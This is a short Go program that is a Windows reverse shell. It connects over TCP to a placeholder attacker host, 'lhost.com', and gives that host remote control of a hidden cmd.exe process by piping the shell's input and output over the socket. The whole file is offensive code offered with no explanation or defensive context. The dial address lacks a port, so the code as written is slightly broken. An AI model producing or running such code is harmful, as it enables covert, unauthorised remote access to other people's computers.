package main
 
import (
    "net"
    "os/exec"
    "syscall"
)
 
func main() {
 
    if client, err := net.Dial("tcp", "lhost.com"); err == nil{
        cmd := exec.Command("cmd.exe")
        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
        cmd.Stdin = client
        cmd.Stdout = client
        cmd.Stderr = client
        cmd.Run()
        client.Close()
    }
}
